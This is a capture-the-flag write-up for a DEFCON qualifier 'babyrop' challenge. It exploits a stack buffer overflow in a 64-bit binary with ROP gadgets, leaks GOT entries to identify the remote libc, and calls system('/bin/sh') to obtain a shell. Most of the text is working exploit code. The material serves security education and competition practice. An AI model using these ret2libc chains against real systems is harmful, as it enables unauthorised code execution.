### DEFCON Qualifiers - Babyrop

Yay, a 64-bit binary this time! Again, non-PIE code, compiled with no canaries and this time babyrop. I bet you already know how we are pwning this. JOP of course :P

Just like the warmup, this is a stack buffer overflow, which allows us to hijack RIP.

They were even nice enough to name the symbol **vuln**. :)

```assembly
public vuln
vuln proc near

s= byte ptr -20h

; __unwind {
push    rbp
mov     rbp, rsp
sub     rsp, 20h
mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
lea     rax, [rbp+s]
mov     esi, 100h       ; n
mov     rdi, rax        ; s
call    _fgets
nop
leave
retn
; } // starts at 400606
vuln endp
```

Now, how do we attack this? First up, let's gather a few interesting gadgets:

```bash
babyrop ROPgadget --binary babyrop
'Gadgets information
============================================================
0x0000000000400562 : adc byte ptr [rax], ah ; jmp rax
0x0000000000400561 : adc byte ptr [rax], spl ; jmp rax
0x000000000040055e : adc dword ptr [rbp - 0x41], ebx ; adc byte ptr [rax], spl ; 

**snip**

0x00000000004004c3 : test rax, rax ; je 0x4004cf ; call rax
0x00000000004005f5 : test rax, rax ; je 0x4005f4 ; push rbp ; mov rbp, rsp ; call rax
0x00000000004004e2 : xor cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 0 ; jmp 0x4004d9
0x00000000004004bf : xor eax, 0x4800200b ; test eax, eax ; je 0x4004d3 ; call rax
```

Well, I guess there's a few stuff... Next up, I built python wrappers for a few of them I though were going to come in handy.

```python
# 0x00000000004006eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
def set_rbp_r12_r13_r14_r15(rbp, r12, r13, r14, r15):
    return p64(0x4006eb) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)

# 0x00000000004006ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
def set_rsp_r13_r14_15(rsp, r13, r14, r15):
    return p64(0x4006ed) + p64(rsp) + p64(r13) + p64(r14) + p64(r15)

# 0x00000000004006f1 : pop rsi ; pop r15 ; ret
def set_rsi_r15(rsi, r15):
    return p64(0x4006f1) + p64(rsi) + p64(r15)

# 04006f3 : pop rdi ; ret
def set_rdi(rdi):
    return p64(0x4006f3) + p64(rdi) 
```

The next big thing was leaking stuff. It just so happens that the program *printf()*s something to us just before calling the read input function, so I constructed a nice leak primitive out of that to leak GOT entries.

```python
LEAK_PRIM = 0x400675

def leak_libc_func(got_entry, byte_num):
    first_stage = 'A'*32 + rbp + set_rdi(got_entry) + p64(LEAK_PRIM)

    p.sendline(first_stage)

    leak = p.recv(byte_num) + "\00" * (8 - byte_num)
    leak = u64(leak)
    return leak
```

Next, what to leak? The target, beyond defeating ASLR of course, was to identify the remote libc version, so I leaked whatever I could.

```python
FGETS_LEAK = leak_libc_func(FGETS_GOT, 6)
SETVBUF_LEAK = leak_libc_func(SETVBUF_GOT, 6)
STDOUT_LEAK = leak_libc_func(STDOUT_BSS, 6)
STDIN_LEAK = leak_libc_func(STDIN_BSS, 6)
```

Voila! The remote libc version was libc6_2.31-0ubuntu9_amd64, so I could now calculate offsets to the base address of libc as well as system, a "/bin/sh" string, basically whatever I needed.

However, while locally everything worked as expected, the remote target refused to hand me the shell. I got a bit paranoid, and started leaking bytes looking for an ELF header at libc base on the remote target and then got more paranoid and started leaking a bunch of memory to undestand where I am, but nothing seemed to work.

```python
# Leak /bin/sh@libc for sanity.
second_stage = 'A'*32 + rbp + set_rdi(LIBC_BASE + BINSH_OFFSET) + p64(LIBC_BASE + PUTS_OFFSET)

# Leak libc for sanity.
second_stage = 'A'*32 + rbp + set_rdi(LIBC_BASE) + p64(LIBC_BASE + PUTS_OFFSET)
```

Then I finally figured it out. For **various** reasons, the 64-bit ABI requires the stack to be 16-bit aligned, which I evidently broke. Adding an extra unnecessary ROP gadget for padding fixed the issue.

```python
second_stage = 'A'*32 + rbp + set_rdi(LIBC_BASE + BINSH_OFFSET) + p64(RET_GADGET) + p64(LIBC_BASE + SYSTEM_OFFSET) + p64(LEAK_PRIM)

p.sendline(second_stage)
p.interactive()

# Shell! :)
```